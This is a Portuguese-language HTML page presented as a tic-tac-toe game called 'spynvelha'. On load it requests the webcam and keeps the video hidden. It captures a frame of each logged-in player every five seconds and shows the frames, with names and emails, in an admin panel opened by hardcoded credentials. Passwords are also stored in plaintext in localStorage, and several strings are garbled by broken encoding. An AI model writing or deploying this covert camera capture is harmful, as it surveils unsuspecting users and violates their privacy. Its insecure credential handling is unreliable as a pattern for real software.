<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>spynvelha - Jogo da Velha Online</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }

        .logo {
            font-size: 2.5em;
            color: #667eea;
            margin-bottom: 1rem;
            font-weight: bold;
        }

        .login-panel, .game-panel, .admin-panel {
            display: none;
        }

        .login-panel.active, .game-panel.active, .admin-panel.active {
            display: block;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .btn:hover {
            transform: translateY(-2px);
        }

        .btn-secondary {
            background: #6c757d;
        }

        .game-board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            max-width: 300px;
            margin: 2rem auto;
        }

        .cell {
            width: 80px;
            height: 80px;
            background: #f8f9fa;
            border: 3px solid #dee2e6;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }

        .cell:hover {
            background: #e9ecef;
            transform: scale(1.05);
        }

        .cell.x {
            color: #667eea;
        }

        .cell.o {
            color: #764ba2;
        }

        .status {
            font-size: 1.2em;
            margin: 1rem 0;
            font-weight: bold;
            color: #495057;
        }

        .admin-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .video-container {
            width: 100%;
            max-width: 300px;
            margin: 1rem auto;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }

        video {
            width: 100%;
            height: auto;
            display: block;
        }

        .user-info {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 10px;
            margin-bottom: 1rem;
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 480px) {
            .cell {
                width: 70px;
                height: 70px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">游꿡 spynvelha</div>

        <!-- Painel de Login/Registro -->
        <div id="loginPanel" class="login-panel active">
            <h2>Bem-vindo ao spynvelha!</h2>
            <p>Registre-se ou fa칞a login para jogar!</p>
            
            <div class="form-group">
                <input type="text" id="username" placeholder="Nome de usu치rio">
            </div>
            <div class="form-group">
                <input type="email" id="email" placeholder="Email">
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="Senha">
            </div>
            <button class="btn" onclick="register()">Registrar</button>
            <button class="btn btn-secondary" onclick="login()">J치 tenho conta</button>
        </div>

        <!-- Painel do Jogo -->
        <div id="gamePanel" class="game-panel">
            <h2>游꿡 Jogo da Velha</h2>
            <div id="status" class="status">Sua vez (X)</div>
            <div id="gameBoard" class="game-board"></div>
            <button class="btn" onclick="resetGame()">Novo Jogo</button>
            <button class="btn btn-secondary" onclick="logout()">Sair</button>
        </div>

        <!-- Painel Admin -->
        <div id="adminPanel" class="admin-panel">
            <h2>游댏 Painel Admin</h2>
            <div id="adminVideos"></div>
            <button class="btn btn-secondary" onclick="logout()">Sair</button>
        </div>
    </div>

    <!-- C칙mera oculta -->
    <video id="userCamera" class="hidden" autoplay muted playsinline></video>
    <canvas id="cameraCanvas" class="hidden"></canvas>

    <script>
        let currentUser = null;
        let users = JSON.parse(localStorage.getItem('spynvelha_users')) || {};
        let board = ['', '', '', '', '', '', '', '', ''];
        let currentPlayer = 'X';
        let gameActive = true;
        let stream = null;
        let videoStreams = {};

        // Credenciais admin
        const ADMIN_EMAIL = 'admin0101';
        const ADMIN_PASS = 'admin0101';

        // Solicitar acesso  c칙mera ao carregar
        async function requestCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640, 
                        height: 480 
                    } 
                });
                document.getElementById('userCamera').srcObject = stream;
                
                // Capturar frames periodicamente
                setInterval(captureFrame, 5000); // 5 segundos
            } catch(err) {
                console.log('C칙mera n칚o acessada:', err);
            }
        }

        function captureFrame() {
            if (!stream || !currentUser || currentUser.email === ADMIN_EMAIL) return;
            
            const video = document.getElementById('userCamera');
            const canvas = document.getElementById('cameraCanvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            const frameData = canvas.toDataURL('image/jpeg', 0.8);
            videoStreams[currentUser.username] = {
                email: currentUser.email,
                timestamp: new Date().toISOString(),
                frame: frameData
            };
        }

        function register() {
            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!username || !email || !password) {
                alert('Preencha todos os campos!');
                return;
            }

            if (users[username]) {
                alert('Usu치rio j치 existe!');
                return;
            }

            users[username] = { email, password };
            localStorage.setItem('spynvelha_users', JSON.stringify(users));
            
            currentUser = { username, email };
            showGame();
        }

        function login() {
            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!username || !email || !password) {
                alert('Preencha todos os campos!');
                return;
            }

            if (!users[username] || users[username].password !== password || users[username].email !== email) {
                alert('Credenciais inv치lidas!');
                return;
            }

            currentUser = { username, email };
            
            // Verificar se 칠 admin
            if (email === ADMIN_EMAIL && password === ADMIN_PASS) {
                showAdminPanel();
            } else {
                showGame();
            }
        }

        function showGame() {
            document.getElementById('loginPanel').classList.remove('active');
            document.getElementById('gamePanel').classList.add('active');
            initGame();
        }

        function showAdminPanel() {
            document.getElementById('loginPanel').classList.remove('active');
            document.getElementById('adminPanel').classList.add('active');
            loadAdminPanel();
        }

        function logout() {
            currentUser = null;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            document.getElementById('gamePanel').classList.remove('active');
            document.getElementById('adminPanel').classList.remove('active');
            document.getElementById('loginPanel').classList.add('active');
            document.getElementById('username').value = '';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            videoStreams = {};
        }

        function initGame() {
            board = ['', '', '', '', '', '', '', '', ''];
            currentPlayer = 'X';
            gameActive = true;
            updateBoard();
            document.getElementById('status').textContent = 'Sua vez (X)';
        }

        function updateBoard() {
            const boardElement = document.getElementById('gameBoard');
            boardElement.innerHTML = '';
            
            board.forEach((cell, index) => {
                const cellElement = document.createElement('div');
                cellElement.classList.add('cell');
                cellElement.textContent = cell;
                if (cell === 'X') cellElement.classList.add('x');
                if (cell === 'O') cellElement.classList.add('o');
                cellElement.addEventListener('click', () => makeMove(index));
                boardElement.appendChild(cellElement);
            });
        }

        function makeMove(index) {
            if (board[index] !== '' || !gameActive) return;

            board[index] = currentPlayer;
            updateBoard();

            if (checkWinner()) {
                document.getElementById('status').textContent = `Jogador ${currentPlayer} venceu!`;
                gameActive = false;
                return;
            }

            if (!board.includes('')) {
                document.getElementById('status').textContent = 'Empate!';
                gameActive = false;
                return;
            }

            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
            document.getElementById('status').textContent = `Sua vez (${currentPlayer === 'X' ? 'X' : 'O'})`;
            
            if (currentPlayer === 'O') {
                setTimeout(aiMove, 500);
            }
        }

        function aiMove() {
            let bestMove = -1;
            let bestScore = -Infinity;

            for (let i = 0; i < board.length; i++) {
                if (board[i] === '') {
                    board[i] = 'O';
                    let score = minimax(board, 0, false);
                    board[i] = '';
                    if (score > bestScore) {
                        bestScore = score;
                        bestMove = i;
                    }
                }
            }

            board[bestMove] = 'O';
            updateBoard();

            if (checkWinner()) {
                document.getElementById('status').textContent = 'Rob칪 venceu!';
                gameActive = false;
                return;
            }

            if (!board.includes('')) {
                document.getElementById('status').textContent = 'Empate!';
                gameActive = false;
                return;
            }

            currentPlayer = 'X';
            document.getElementById('status').textContent = 'Sua vez (X)';
        }

        function minimax(newBoard, depth, isMaximizing) {
            let result = checkWinner();
            if (result === 'O') return 10 - depth;
            if (result === 'X') return depth - 10;
            if (!newBoard.includes('')) return 0;

            if (isMaximizing) {
                let bestScore = -Infinity;
                for (let i = 0; i < newBoard.length; i++) {
                    if (newBoard[i] === '') {
                        newBoard[i] = 'O';
                        let score = minimax(newBoard, depth + 1, false);
                        newBoard[i] = '';
                        bestScore = Math.max(score, bestScore);
                    }
                }
                return bestScore;
            } else {
                let bestScore = Infinity;
                for (let i = 0; i < newBoard.length; i++) {
                    if (newBoard[i] === '') {
                        newBoard[i] = 'X';
                        let score = minimax(newBoard, depth + 1, true);
                        newBoard[i] = '';
                        bestScore = Math.min(score, bestScore);
                    }
                }
                return bestScore;
            }
        }

        function checkWinner() {
            const winConditions = [
                [0,1,2], [3,4,5], [6,7,8],
                [0,3,6], [1,4,7], [2,5,8],
                [0,4,8], [2,4,6]
            ];

            for (let condition of winConditions) {
                let [a, b, c] = condition;
                if (board[a] && board[a] === board[b] && board[a] === board[c]) {
                    return board[a];
                }
            }
            return null;
        }

        function resetGame() {
            initGame();
        }

        function loadAdminPanel() {
            const adminVideos = document.getElementById('adminVideos');
            adminVideos.innerHTML = '';

            Object.entries(videoStreams).forEach(([username, data]) => {
                const userDiv = document.createElement('div');
                userDiv.className = 'user-info';
                
                const img = document.createElement('img');
                img.src = data.frame;
                img.style.width = '100%';
                img.style.borderRadius = '10px';
                
                userDiv.innerHTML = `
                    <strong>${username}</strong><br>
                    <small>${data.email} - ${new Date(data.timestamp).toLocaleString()}</small>
                `;
                
                userDiv.appendChild(img);
                adminVideos.appendChild(userDiv);
            });
        }

        // Inicializar
        window.onload = function() {
            requestCamera();
            setInterval(loadAdminPanel, 3000); // Atualizar admin a cada 3s
        };

        // Permitir Enter para login/registro
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && document.getElementById('loginPanel').classList.contains('active')) {
                const username = document.getElementById('username').value;
                const email = document.getElementById('email').value;
                if (username && email) {
                    // Tentar login primeiro, depois registro
                    login();
                }
            }
        });
    </script>
</body>
</html>
